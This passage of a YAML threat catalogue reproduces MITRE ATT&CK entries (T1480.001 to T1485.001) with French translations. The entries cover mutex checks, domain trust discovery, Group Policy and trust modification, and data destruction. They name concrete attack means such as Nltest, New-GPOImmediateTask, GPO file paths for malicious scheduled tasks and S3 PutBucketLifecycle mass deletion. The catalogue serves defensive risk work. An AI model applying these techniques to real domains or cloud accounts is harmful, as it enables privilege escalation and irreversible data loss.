          \ classiques de [contournement de la virtualisation/du bac \xE0 sable](https://attack.mitre.org/techniques/T1497).\
          \ Alors que le recours au [contournement de la virtualisation/du bac \xE0\
          \ sable](https://attack.mitre.org/techniques/T1497) peut impliquer de v\xE9\
          rifier la pr\xE9sence de valeurs connues du bac \xE0 sable et de ne poursuivre\
          \ l\u2019ex\xE9cution qu\u2019en l\u2019absence de correspondance, l\u2019\
          utilisation du \xAB keying \xBB environnemental consiste \xE0 v\xE9rifier\
          \ la pr\xE9sence d\u2019une valeur sp\xE9cifique \xE0 la cible attendue,\
          \ qui doit correspondre pour que le d\xE9chiffrement et l\u2019ex\xE9cution\
          \ qui s\u2019ensuit puissent aboutir.\nhttps://attack.mitre.org/techniques/T1480/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480.002
    ref_id: T1480.002
    name: Mutual Exclusion
    description: 'Adversaries may constrain execution or actions based on the presence
      of a mutex associated with malware. A mutex is a locking mechanism used to synchronize
      access to a resource. Only one thread or process can acquire a mutex at a given
      time.(Citation: Microsoft Mutexes)


      While local mutexes only exist within a given process, allowing multiple threads
      to synchronize access to a resource, system mutexes can be used to synchronize
      the activities of multiple processes.(Citation: Microsoft Mutexes) By creating
      a unique system mutex associated with a particular malware, adversaries can
      verify whether or not a system has already been compromised.(Citation: Sans
      Mutexes 2012)


      In Linux environments, malware may instead attempt to acquire a lock on a mutex
      file. If the malware is able to acquire the lock, it continues to execute; if
      it fails, it exits to avoid creating a second instance of itself.(Citation:
      Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)


      Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation:
      ICS Mutexes 2015)

      https://attack.mitre.org/techniques/T1480/002'
    translations:
      fr:
        name: Exclusion mutuelle
        description: "Les adversaires peuvent contraindre l\u2019ex\xE9cution ou les\
          \ actions en fonction de la pr\xE9sence d\u2019un mutex associ\xE9 \xE0\
          \ un logiciel malveillant. Un mutex est un m\xE9canisme de verrouillage\
          \ utilis\xE9 pour synchroniser l\u2019acc\xE8s \xE0 une ressource. Un seul\
          \ fil ou processus peut acqu\xE9rir un mutex \xE0 la fois. (Citation : Microsoft\
          \ Mutexes)\n\nAlors que les mutex locaux n\u2019existent qu\u2019au sein\
          \ d\u2019un processus donn\xE9, permettant \xE0 plusieurs threads de synchroniser\
          \ l\u2019acc\xE8s \xE0 une ressource, les mutex syst\xE8me peuvent \xEA\
          tre utilis\xE9s pour synchroniser les activit\xE9s de plusieurs processus.\
          \ (Citation : Microsoft Mutexes) En cr\xE9ant un mutex syst\xE8me unique\
          \ associ\xE9 \xE0 un malware particulier, les adversaires peuvent v\xE9\
          rifier si un syst\xE8me a d\xE9j\xE0 \xE9t\xE9 compromis ou non. (Citation\
          \ : Sans Mutexes 2012)\n\nDans les environnements Linux, les logiciels malveillants\
          \ peuvent plut\xF4t tenter d\u2019obtenir un verrou sur un fichier mutex.\
          \ Si le malware parvient \xE0 acqu\xE9rir le verrou, il continue de s\u2019\
          ex\xE9cuter ; s\u2019il \xE9choue, il sort pour \xE9viter de cr\xE9er une\
          \ seconde instance de lui-m\xEAme. (Citation : Intezer RedXOR 2021)(Citation\
          \ : Deep Instinct BPFDoor 2023)\n\nLes noms mutex peuvent \xEAtre cod\xE9\
          s en dur ou g\xE9n\xE9r\xE9s dynamiquement \xE0 l\u2019aide d\u2019un algorithme\
          \ pr\xE9visible. (Citation : ICS Mutexes 2015)\nhttps://attack.mitre.org/techniques/T1480/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1482
    ref_id: T1482
    name: Domain Trust Discovery
    description: 'Adversaries may attempt to gather information on domain trust relationships
      that may be used to identify lateral movement opportunities in Windows multi-domain/forest
      environments. Domain trusts provide a mechanism for a domain to allow access
      to resources based on the authentication procedures of another domain.(Citation:
      Microsoft Trusts) Domain trusts allow the users of the trusted domain to access
      resources in the trusting domain. The information discovered may help the adversary
      conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005),
      [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation:
      AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts
      can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET
      methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359)
      is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft
      Operation Wilysupply)

      https://attack.mitre.org/techniques/T1482'
    translations:
      fr:
        name: "D\xE9couverte de la confiance de domaine"
        description: "Les adversaires peuvent tenter de recueillir des informations\
          \ sur les relations de confiance de domaine qui peuvent \xEAtre utilis\xE9\
          es pour identifier des opportunit\xE9s de d\xE9placement lat\xE9ral dans\
          \ des environnements multi-domaines/for\xEAts Windows. Les trusts de domaine\
          \ fournissent un m\xE9canisme permettant \xE0 un domaine d\u2019acc\xE9\
          der aux ressources en fonction des proc\xE9dures d\u2019authentification\
          \ d\u2019un autre domaine. (Citation : Microsoft Trusts) Les trusts de domaine\
          \ permettent aux utilisateurs du domaine de confiance d\u2019acc\xE9der\
          \ aux ressources du domaine de confiance. Les informations d\xE9couvertes\
          \ peuvent aider l\u2019adversaire \xE0 effectuer [injection d\u2019ant\xE9\
          c\xE9dents de SID](https://attack.mitre.org/techniques/T1134/005), [Pass\
          \ the Ticket](https://attack.mitre.org/techniques/T1550/003) et [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).\
          \ (Citation : AdSecurity falsifie des tickets de confiance)(Citation : Fiducies\
          \ de domaine Harmj0y) Les trusts de domaine peuvent \xEAtre \xE9num\xE9\
          r\xE9s en utilisant l\u2019appel API Win32 'DSEnumerateDomainTrusts()',\
          \ les m\xE9thodes .NET et LDAP. (Citation : Fiducies de domaine Harmj0y)\
          \ L\u2019utilitaire Windows [Nltest](https://attack.mitre.org/software/S0359)\
          \ est connu pour \xEAtre utilis\xE9 par les adversaires afin d\u2019\xE9\
          num\xE9rer les trusts de domaine. (Citation : Op\xE9ration Microsoft Wilysupply)\n\
          https://attack.mitre.org/techniques/T1482"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484
    ref_id: T1484
    name: Domain or Tenant Policy Modification
    description: "Adversaries may modify the configuration settings of a domain or\
      \ identity tenant to evade defenses and/or escalate privileges in centrally\
      \ managed environments. Such services provide a centralized means of managing\
      \ identity resources such as devices and accounts, and often include configuration\
      \ settings that may apply between domains or tenants such as trust relationships,\
      \ identity syncing, or identity federation.\n\nModifications to domain or tenant\
      \ settings may include altering domain Group Policy Objects (GPOs) in Microsoft\
      \ Active Directory (AD) or changing trust settings for domains, including federation\
      \ trusts relationships between domains or tenants.\n\nWith sufficient permissions,\
      \ adversaries can modify domain or tenant policy settings. Since configuration\
      \ settings for these services apply to a large number of identity resources,\
      \ there are a great number of potential attacks malicious outcomes that can\
      \ stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs\
      \ to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)\
      \ to computers throughout the domain environment(Citation: ADSecurity GPO Persistence\
      \ 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)\n\
      * modifying domain trusts to include an adversary-controlled domain, allowing\
      \ adversaries to  forge access tokens that will subsequently be accepted by\
      \ victim domain resources(Citation: Microsoft - Customer Guidance on Recent\
      \ Nation-State Cyber Attacks)\n* changing configuration settings within the\
      \ AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\
      * adding new, adversary-controlled federated identity providers to identity\
      \ tenants, allowing adversaries to authenticate as any user managed by the victim\
      \ tenant (Citation: Okta Cross-Tenant Impersonation 2023)\n\nAdversaries may\
      \ temporarily modify domain or tenant policy, carry out a malicious action(s),\
      \ and then revert the change to remove suspicious indicators.\nhttps://attack.mitre.org/techniques/T1484"
    translations:
      fr:
        name: Modification de la politique de domaine ou de locataire
        description: "Les adversaires peuvent modifier les param\xE8tres de configuration\
          \ d\u2019un domaine ou d\u2019un tenant d\u2019identit\xE9 pour contourner\
          \ les d\xE9fenses et/ou escalader les privil\xE8ges dans des environnements\
          \ g\xE9r\xE9s de mani\xE8re centralis\xE9e. Ces services offrent un moyen\
          \ centralis\xE9 de g\xE9rer les ressources d\u2019identit\xE9 telles que\
          \ les appareils et les comptes, et incluent souvent des param\xE8tres de\
          \ configuration pouvant s\u2019appliquer entre domaines ou locataires, tels\
          \ que des relations de confiance, la synchronisation d\u2019identit\xE9\
          \ ou la f\xE9d\xE9ration d\u2019identit\xE9s.\n\nLes modifications apport\xE9\
          es aux param\xE8tres de domaine ou de locataire peuvent inclure la modification\
          \ des objets de politique de groupe de domaine (GPO) dans Microsoft Active\
          \ Directory (AD) ou la modification des param\xE8tres de confiance pour\
          \ les domaines, y compris les relations de f\xE9d\xE9ration entre domaines\
          \ ou locataires.\n\nAvec suffisamment d\u2019autorisations, les adversaires\
          \ peuvent modifier les param\xE8tres de politique de domaine ou de locataire.\
          \ Puisque les param\xE8tres de configuration de ces services s\u2019appliquent\
          \ \xE0 un grand nombre de ressources d\u2019identit\xE9, il existe de nombreuses\
          \ attaques potentielles avec des cons\xE9quences malveillantes pouvant d\xE9\
          couler de cet abus. Des exemples de tels abus incluent :  \n\n* modification\
          \ des GPO pour envoyer une [T\xE2che Planifi\xE9e](https://attack.mitre.org/techniques/T1053/005)\
          \ malveillante aux ordinateurs de tout l\u2019environnement du domaine (Citation\
          \ : ADSecurity GPO Persistence 2016)(Citation : Wald0 Guide to GPOs)(Citation\
          \ : Harmj0y abusant des permissions GPO)\n* modification des trusts de domaine\
          \ pour inclure un domaine contr\xF4l\xE9 par l\u2019adversaire, permettant\
          \ aux adversaires de falsifier des jetons d\u2019acc\xE8s qui seront ensuite\
          \ accept\xE9s par les ressources du domaine victime (Citation : Microsoft\
          \ - Guide client sur les cyberattaques r\xE9centes entre \xC9tats-nations)\n\
          * modification des param\xE8tres de configuration dans l\u2019environnement\
          \ AD pour impl\xE9menter un [Contr\xF4leur de Domaine Rogue](https://attack.mitre.org/techniques/T1207).\n\
          * ajouter de nouveaux fournisseurs d\u2019identit\xE9 f\xE9d\xE9r\xE9s contr\xF4\
          l\xE9s par l\u2019adversaire aux locataires d\u2019identit\xE9, permettant\
          \ aux adversaires de s\u2019authentifier en tant qu\u2019utilisateur g\xE9\
          r\xE9 par le locataire victime (Citation : Okta Cross-Tenant Impersonation\
          \ 2023)\n\nLes adversaires peuvent temporairement modifier la politique\
          \ du domaine ou du locataire, effectuer une ou plusieurs actions malveillantes,\
          \ puis annuler le changement pour supprimer les indicateurs suspects.\n\
          https://attack.mitre.org/techniques/T1484"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484.001
    ref_id: T1484.001
    name: Group Policy Modification
    description: "Adversaries may modify Group Policy Objects (GPOs) to subvert the\
      \ intended discretionary access controls for a domain, usually with the intention\
      \ of escalating privileges on the domain. Group policy allows for centralized\
      \ management of user and computer settings in Active Directory (AD). GPOs are\
      \ containers for group policy settings made up of files stored within a predictable\
      \ network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet\
      \ Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other\
      \ objects in AD, GPOs have access controls associated with them. By default\
      \ all user accounts in the domain have permission to read GPOs. It is possible\
      \ to delegate GPO access control permissions, e.g. write access, to specific\
      \ users or groups in the domain.\n\nMalicious GPO modifications can be used\
      \ to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),\
      \ [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685), [Ingress\
      \ Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136),\
      \ [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation:\
      \ ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation:\
      \ Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation:\
      \ Microsoft Hacking Team Breach) Since GPOs can control so many user and machine\
      \ settings in the AD environment, there are a great number of potential attacks\
      \ that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example,\
      \ publicly available scripts such as <code>New-GPOImmediateTask</code> can be\
      \ leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)\
      \ by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\\
      Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0\
      \ Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an\
      \ adversary might modify specific user rights like SeEnableDelegationPrivilege,\
      \ set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>,\
      \ to achieve a subtle AD backdoor with complete control of the domain because\
      \ the user account under the adversary's control would then be able to modify\
      \ GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)\nhttps://attack.mitre.org/techniques/T1484/001"
    translations:
      fr:
        name: Modification de la politique de groupe
        description: "Les adversaires peuvent modifier les objets de politique de\
          \ groupe (GPO) pour subvertir les contr\xF4les d\u2019acc\xE8s discr\xE9\
          tionnaires pr\xE9vus pour un domaine, g\xE9n\xE9ralement dans le but d\u2019\
          escalader les privil\xE8ges sur le domaine. La strat\xE9gie de groupe permet\
          \ une gestion centralis\xE9e des param\xE8tres utilisateur et informatique\
          \ dans Active Directory (AD). Les GPO sont des conteneurs pour les param\xE8\
          tres de strat\xE9gie de groupe compos\xE9s de fichiers stock\xE9s dans un\
          \ chemin r\xE9seau pr\xE9visible '<DOMAIN>\\\\<DOMAIN>SYSVOL\\\\Policies'.(\
          \ Citation : Bases de la politique de groupe TechNet)(Citation : ADSecurity\
          \ GPO Persistence 2016) \n\nComme d\u2019autres objets dans AD, les GPO\
          \ sont \xE9quip\xE9s de contr\xF4les d\u2019acc\xE8s associ\xE9s. Par d\xE9\
          faut, tous les comptes utilisateurs du domaine ont la permission de lire\
          \ les GPO. Il est possible de d\xE9l\xE9guer les permissions de contr\xF4\
          le d\u2019acc\xE8s GPO, par exemple l\u2019acc\xE8s d\u2019\xE9criture,\
          \ \xE0 des utilisateurs ou groupes sp\xE9cifiques du domaine.\n\nLes modifications\
          \ malveillantes des GPO peuvent \xEAtre utilis\xE9es pour impl\xE9menter\
          \ de nombreux autres comportements malveillants tels que [T\xE2che/T\xE2\
          che planifi\xE9e](https://attack.mitre.org/techniques/T1053), [D\xE9sactiver\
          \ ou modifier les outils](https://attack.mitre.org/techniques/T1685), [Transfert\
          \ d\u2019outil d\u2019entr\xE9e](https://attack.mitre.org/techniques/T1105),\
          \ [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136), [Ex\xE9\
          cution de service](https://attack.mitre.org/techniques/T1569/002), et bien\
          \ d\u2019autres. (Citation : ADSecurity GPO Persistence 2016)(Citation :\
          \ Guide Wald0 des GPO)(Citation : Harmj0y abusant des permissions GPO)(Citation\
          \ : Mandiant M Trends 2016)(Citation : Br\xE8che de l\u2019\xE9quipe de\
          \ piratage Microsoft) Puisque les GPO peuvent contr\xF4ler de nombreux param\xE8\
          tres utilisateur et machine dans l\u2019environnement AD, il existe de nombreuses\
          \ attaques potentielles qui peuvent d\xE9couler de cet abus des GPO. (Citation\
          \ : Guide Wald0 des GPO)\n\nPar exemple, des scripts publics tels que <code>New-GPOImmediateTask</code>\
          \ peuvent \xEAtre exploit\xE9s pour automatiser la cr\xE9ation d\u2019une\
          \ [t\xE2che/t\xE2che planifi\xE9e](https://attack.mitre.org/techniques/T1053)\
          \ malveillante en modifiant les param\xE8tres GPO, dans ce cas en modifiant\
          \ <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.\
          \ (Citation : Guide Wald0 des GPO)(Citation : Harmj0y abusant des permissions\
          \ GPO) Dans certains cas, un adversaire peut modifier des droits utilisateur\
          \ sp\xE9cifiques comme SeEnableDelegationPrivilege, d\xE9fini dans <code>&lt;GPO_PATH&gt;\\\
          MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, afin d\u2019\
          obtenir une porte d\xE9rob\xE9e AD subtile avec un contr\xF4le total du\
          \ domaine, car le compte utilisateur sous le contr\xF4le de l\u2019adversaire\
          \ pourrait alors modifier les GPO. (Citation : Harmj0y VoEnableDelegationPrivilege\
          \ Droit)\nhttps://attack.mitre.org/techniques/T1484/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484.002
    ref_id: T1484.002
    name: Trust Modification
    description: "Adversaries may add new domain trusts, modify the properties of\
      \ existing domain trusts, or otherwise change the configuration of trust relationships\
      \ between domains and tenants to evade defenses and/or elevate privileges.Trust\
      \ details, such as whether or not user identities are federated, allow authentication\
      \ and authorization properties to apply between domains or tenants for the purpose\
      \ of accessing shared resources.(Citation: Microsoft - Azure AD Federation)\
      \ These trust objects may include accounts, credentials, and other authentication\
      \ material applied to servers, tokens, and domains.\n\nManipulating these trusts\
      \ may allow an adversary to escalate privileges and/or evade defenses by modifying\
      \ settings to add objects which they control. For example, in Microsoft Active\
      \ Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002)\
      \ without the need to compromise the signing certificate to forge new credentials.\
      \ Instead, an adversary can manipulate domain trusts to add their own signing\
      \ certificate. An adversary may also convert an AD domain to a federated domain\
      \ using Active Directory Federation Services (AD FS), which may enable malicious\
      \ trust modifications such as altering the claim issuance rules to log in any\
      \ valid set of credentials as a specified user.(Citation: AADInternals zure\
      \ AD Federated Domain) \n\nAn adversary may also add a new federated identity\
      \ provider to an identity tenant such as Okta or AWS IAM Identity Center, which\
      \ may enable the adversary to authenticate as any user of the tenant.(Citation:\
      \ Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to\
      \ gain broad access into a variety of cloud-based services that leverage the\
      \ identity tenant. For example, in AWS environments, an adversary that creates\
      \ a new identity provider for an AWS Organization will be able to federate into\
      \ all of the AWS Organization member accounts without creating identities for\
      \ each of the member accounts.(Citation: AWS re Inforce Trust Mod)\nhttps://attack.mitre.org/techniques/T1484/002"
    translations:
      fr:
        name: Modification de la fiducie
        description: "Les adversaires peuvent ajouter de nouveaux trusts de domaine,\
          \ modifier les propri\xE9t\xE9s des trusts de domaine existants, ou modifier\
          \ autrement la configuration des relations de confiance entre domaines et\
          \ locataires afin d\u2019\xE9viter les d\xE9fenses et/ou d\u2019\xE9lever\
          \ des privil\xE8ges. Les d\xE9tails de confiance, tels que la f\xE9d\xE9\
          ration ou non des identit\xE9s utilisateurs, permettent l\u2019application\
          \ de propri\xE9t\xE9s d\u2019authentification et d\u2019autorisation entre\
          \ domaines ou locataires dans le but d\u2019acc\xE9der aux ressources partag\xE9\
          es. (Citation : Microsoft - F\xE9d\xE9ration Azure AD) Ces objets de confiance\
          \ peuvent inclure des comptes, des identifiants et d\u2019autres documents\
          \ d\u2019authentification appliqu\xE9s aux serveurs, jetons et domaines.\n\
          \nManipuler ces trusts peut permettre \xE0 un adversaire d\u2019escalader\
          \ des privil\xE8ges et/ou d\u2019\xE9chapper aux d\xE9fenses en modifiant\
          \ les param\xE8tres pour ajouter des objets qu\u2019il contr\xF4le. Par\
          \ exemple, dans les environnements Microsoft Active Directory (AD), cela\
          \ peut \xEAtre utilis\xE9 pour falsifier des [jetons SAML](https://attack.mitre.org/techniques/T1606/002)\
          \ sans avoir besoin de compromettre le certificat de signature pour falsifier\
          \ de nouvelles identifiantes. \xC0 la place, un adversaire peut manipuler\
          \ les trusts de domaine pour ajouter son propre certificat de signature.\
          \ Un adversaire peut \xE9galement convertir un domaine AD en domaine f\xE9\
          d\xE9r\xE9 en utilisant Active Directory Federation Services (AD FS), ce\
          \ qui peut permettre des modifications de confiance malveillantes, telles\
          \ que la modification des r\xE8gles d\u2019\xE9mission de r\xE9clamations\
          \ pour se connecter \xE0 un ensemble valide d\u2019identifiants en tant\
          \ qu\u2019utilisateur sp\xE9cifi\xE9. (Citation : AADInternals zure AD Federated\
          \ Domain) \n\nUn adversaire peut \xE9galement ajouter un nouveau fournisseur\
          \ d\u2019identit\xE9 f\xE9d\xE9r\xE9 \xE0 un locataire d\u2019identit\xE9\
          \ tel qu\u2019Okta ou AWS IAM Identity Center, ce qui peut permettre \xE0\
          \ l\u2019adversaire de s\u2019authentifier en tant qu\u2019utilisateur du\
          \ locataire. (Citation : Usurpation d\u2019identit\xE9 entre locataires\
          \ Okta 2023) Cela peut permettre \xE0 l\u2019acteur de la menace d\u2019\
          acc\xE9der largement \xE0 une vari\xE9t\xE9 de services cloud qui tirent\
          \ parti du locataire d\u2019identit\xE9. Par exemple, dans les environnements\
          \ AWS, un adversaire qui cr\xE9e un nouveau fournisseur d\u2019identit\xE9\
          \ pour une organisation AWS pourra f\xE9d\xE9rer en tous les comptes membres\
          \ de l\u2019organisation AWS sans cr\xE9er d\u2019identit\xE9s pour chacun\
          \ des comptes membres. (Citation : AWS re Inforce Trust Mod)\nhttps://attack.mitre.org/techniques/T1484/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485
    ref_id: T1485
    name: Data Destruction
    description: 'Adversaries may destroy data and files on specific systems or in
      large numbers on a network to interrupt availability to systems, services, and
      network resources. Data destruction is likely to render stored data irrecoverable
      by forensic techniques through overwriting files or data on local and remote
      drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation:
      Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit
      42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system
      file deletion commands such as <code>del</code> and <code>rm</code> often only
      remove pointers to files without wiping the contents of the files themselves,
      making the files recoverable by proper forensic methodology. This behavior is
      distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)
      and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because
      individual files are destroyed rather than sections of a storage disk or the
      disk''s logical structure.


      Adversaries may attempt to overwrite files and directories with randomly generated
      data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation:
      Unit 42 Shamoon3 2018) In some cases politically oriented image files have been
      used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto
      Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware designed for destroying data
      may have worm-like features to propagate across a network by leveraging additional
      techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec
      Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon
      Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer
      2018).


      In cloud environments, adversaries may leverage access to delete cloud storage
      objects, machine images, database instances, and other infrastructure crucial
      to operations to damage an organization or their customers.(Citation: Data Destruction
      - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual
      machines from on-prem virtualized environments.

      https://attack.mitre.org/techniques/T1485'
    translations:
      fr:
        name: "Destruction des donn\xE9es"
        description: "Les adversaires peuvent d\xE9truire des donn\xE9es et des fichiers\
          \ sur des syst\xE8mes sp\xE9cifiques ou en grand nombre sur un r\xE9seau\
          \ afin d\u2019interrompre la disponibilit\xE9 des syst\xE8mes, services\
          \ et ressources r\xE9seau. La destruction des donn\xE9es rendra probablement\
          \ les donn\xE9es stock\xE9es irr\xE9cup\xE9rables par des techniques m\xE9\
          dico-l\xE9gales en \xE9crasant des fichiers ou des donn\xE9es sur des disques\
          \ locaux et distants. (Citation : Symantec Shamoon 2012)(Citation : FireEye\
          \ Shamoon, novembre 2016)(Citation : Palo Alto Shamoon, novembre 2016)(Citation\
          \ : Kaspersky StoneDrill 2017)(Citation : Unit\xE9 42 Shamoon3 2018)(Citation\
          \ : Talos Olympic Destroyer 2018) Les commandes courantes de suppression\
          \ de fichiers des syst\xE8mes d\u2019exploitation, telles <code>que del</code>\
          \ et <code>rm</code>, ne suppriment souvent que les pointeurs vers les fichiers\
          \ sans effacer le contenu des fichiers eux-m\xEAmes, rendant ainsi les fichiers\
          \ r\xE9cup\xE9rables par une m\xE9thodologie m\xE9dico-l\xE9gale appropri\xE9\
          e. Ce comportement se distingue de [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
          \ et [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)\
          \ car les fichiers individuels sont d\xE9truits plut\xF4t que des sections\
          \ d\u2019un disque de stockage ou de la structure logique du disque.\n\n\
          Les adversaires peuvent tenter d\u2019\xE9craser les fichiers et r\xE9pertoires\
          \ avec des donn\xE9es g\xE9n\xE9r\xE9es al\xE9atoirement pour les rendre\
          \ irr\xE9cup\xE9rables. (Citation : Kaspersky StoneDrill 2017)(Citation\
          \ : Unit\xE9 42 Shamoon3 2018) Dans certains cas, des fichiers image \xE0\
          \ caract\xE8re politique ont \xE9t\xE9 utilis\xE9s pour \xE9craser des donn\xE9\
          es. (Citation : FireEye Shamoon, novembre 2016)(Citation : Palo Alto Shamoon,\
          \ novembre 2016)(Citation : Kaspersky StoneDrill 2017)\n\nPour maximiser\
          \ l\u2019impact sur l\u2019organisation cible dans les op\xE9rations o\xF9\
          \ l\u2019interruption de disponibilit\xE9 \xE0 l\u2019\xE9chelle du r\xE9\
          seau est l\u2019objectif, les logiciels malveillants con\xE7us pour d\xE9\
          truire les donn\xE9es peuvent disposer de fonctionnalit\xE9s de type ver\
          \ \xE0 propager \xE0 travers un r\xE9seau en utilisant des techniques suppl\xE9\
          mentaires telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d\u2019administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Symantec Shamoon 2012)(Citation : FireEye Shamoon, novembre\
          \ 2016)(Citation : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky\
          \ StoneDrill 2017)(Citation : Talos Olympic Destroyer 2018).\n\nDans les\
          \ environnements cloud, les adversaires peuvent tirer parti de l\u2019acc\xE8\
          s pour supprimer des objets de stockage cloud, des images machines, des\
          \ instances de bases de donn\xE9es et d\u2019autres infrastructures cruciales\
          \ pour les op\xE9rations, afin de nuire \xE0 une organisation ou \xE0 ses\
          \ clients. (Citation : Destruction des donn\xE9es - Post de menace)(Citation\
          \ : DOJ - Cisco Insider) De m\xEAme, ils peuvent supprimer des machines\
          \ virtuelles des environnements virtualis\xE9s sur site.\nhttps://attack.mitre.org/techniques/T1485"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485.001
    ref_id: T1485.001
    name: Lifecycle-Triggered Deletion
    description: "Adversaries may modify the lifecycle policies of a cloud storage\
      \ bucket to destroy all objects stored within.  \n\nCloud storage buckets often\
      \ allow users to set lifecycle policies to automate the migration, archival,\
      \ or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation:\
      \ GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor\
      \ has sufficient permissions to modify these policies, they may be able to delete\
      \ all objects at once. \n\nFor example, in AWS environments, an adversary with\
      \ the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle`\
      \ API call to apply a lifecycle policy to an S3 bucket that deletes all objects\
      \ in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation:\
      \ Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of\
      \ extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657),\
      \ adversaries may also perform this action on buckets storing cloud logs for\
      \ [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation:\
      \ Datadog S3 Lifecycle CloudTrail Logs)\nhttps://attack.mitre.org/techniques/T1485/001"
    translations:
      fr:
        name: "Suppression d\xE9clench\xE9e par le cycle de vie"
        description: "Les adversaires peuvent modifier les politiques de cycle de\
          \ vie d\u2019un seau de stockage cloud pour d\xE9truire tous les objets\
          \ stock\xE9s \xE0 l\u2019int\xE9rieur.  \n\nLes buckets de stockage cloud\
          \ permettent souvent aux utilisateurs de d\xE9finir des politiques de cycle\
          \ de vie pour automatiser la migration, l\u2019archivage ou la suppression\
          \ des objets apr\xE8s une p\xE9riode d\xE9termin\xE9e. (Citation : Cycles\
          \ de vie de stockage AWS)(Citation : Cycles de vie de stockage GCP)(Citation\
          \ : Cycles de vie Azure Storage) Si un acteur malveillant dispose de suffisamment\
          \ d\u2019autorisations pour modifier ces politiques, il peut \xEAtre capable\
          \ de supprimer tous les objets d\u2019un coup. \n\nPar exemple, dans les\
          \ environnements AWS, un adversaire disposant de la permission \xAB PutLifecycleConfiguration\
          \ \xBB peut utiliser l\u2019appel API \xAB PutBucketLifecycle \xBB pour\
          \ appliquer une politique de cycle de vie \xE0 un compartiment S3 qui supprime\
          \ tous les objets du compartiment apr\xE8s un jour. (Citation : ransomware\
          \ cloud de Palo Alto)(Citation : Halcyon AWS Ransomware 2025) En plus de\
          \ d\xE9truire des donn\xE9es \xE0 des fins d\u2019extorsion et de [vol financier](https://attack.mitre.org/techniques/T1657),\
          \ les adversaires peuvent \xE9galement effectuer cette action sur des buckets\
          \ stockant des journaux cloud pour [suppression d\u2019indicateurs](https://attack.mitre.org/techniques/T1070).\
          \ (Citation : Journaux CloudTrail du cycle de vie Datadog S3)\nhttps://attack.mitre.org/techniques/T1485/001"
